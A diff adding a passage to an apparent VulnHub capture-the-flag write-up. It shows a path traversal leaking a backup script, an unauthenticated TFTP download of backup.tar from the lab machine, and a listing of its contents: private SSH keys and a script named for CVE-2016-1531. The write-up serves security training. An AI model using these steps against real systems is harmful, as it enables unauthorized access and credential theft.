@@ -52,6 +52,54 @@ i used burp to repeat the process for a path traversal vulnerability and it work
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a65ba4fd-84bf-4435-96b2-ecd4abfebae4)
 
 
+after sending request to `/usr/local/scripts/backup.sh` the contents below showed up :
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0211def6-716a-4d36-9dac-77338580233e)
+
+
+here it says that backups are accessible through tftp, so we can check if we can reach it :
+
+```bash
+root@kali: tftp 192.168.127.133
+tftp> get /backups/backup.tar
+tftp> quit
+```
+
+now we extract the backup.tar file and see there are 2 directories in it :
+
+```bash
+root@kali: tar -xvf backup.tar
+```
+
+navigate to `home` folder and see the contents :
+
+
+```bash
+root@kali: tree .              
+.
+├── bob
+├── CVE-2016-1531.sh
+├── paul
+│   └── keys
+│       ├── id_key1
+│       ├── id_key1.pub
+│       ├── id_key2
+│       ├── id_key2.pub
+│       ├── id_key3
+│       ├── id_key3.pub
+│       ├── id_key4
+│       ├── id_key4.pub
+│       ├── id_key5
+│       ├── id_key5.pub
+│       ├── id_key6
+│       └── id_key6.pub
+└── peter
+```
+
+
+
+
+
 
 
 
